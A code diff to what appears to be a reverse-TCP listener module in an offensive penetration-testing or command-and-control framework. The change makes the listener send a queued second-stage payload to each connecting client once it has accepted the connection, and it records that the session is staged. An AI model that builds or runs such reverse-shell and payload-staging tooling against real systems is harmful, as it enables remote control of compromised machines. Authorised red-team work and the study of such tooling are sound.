@@ -74,13 +74,30 @@ class Module(Listener):
                 # Accept connection
                 client_socket, address = self.sock.accept()
                 print_success(f"Connection received from {address[0]}:{address[1]}")
-                
-                # Return connection data - framework extracts info from __info__
-                return (client_socket, address[0], address[1], {
-                    'connection_type': 'reverse',
-                    'protocol': 'tcp',
-                    'stager_line_mode': True,
-                })
+
+                extra = {
+                    "connection_type": "reverse",
+                    "protocol": "tcp",
+                    "stager_line_mode": True,
+                }
+                try:
+                    from core.framework.stager_stage import pop_pending_stage, send_stage_over_socket
+
+                    lhost_key = getattr(self, "lhost", "") or ""
+                    if hasattr(lhost_key, "value"):
+                        lhost_key = lhost_key.value
+                    lhost_key = str(lhost_key or "")
+                    lport_raw = getattr(self, "lport", 0) or 0
+                    lport_key = int(getattr(lport_raw, "value", lport_raw) or 0)
+                    stage = pop_pending_stage(lhost_key, lport_key)
+                    if stage:
+                        send_stage_over_socket(client_socket, stage)
+                        print_success(f"Staged payload sent ({len(stage)} bytes)")
+                        extra["staged"] = True
+                except Exception as exc:
+                    print_warning(f"Stage delivery skipped: {exc}")
+
+                return (client_socket, address[0], address[1], extra)
                 
             except socket.timeout:
                 # Timeout occurred, return None to continue listening
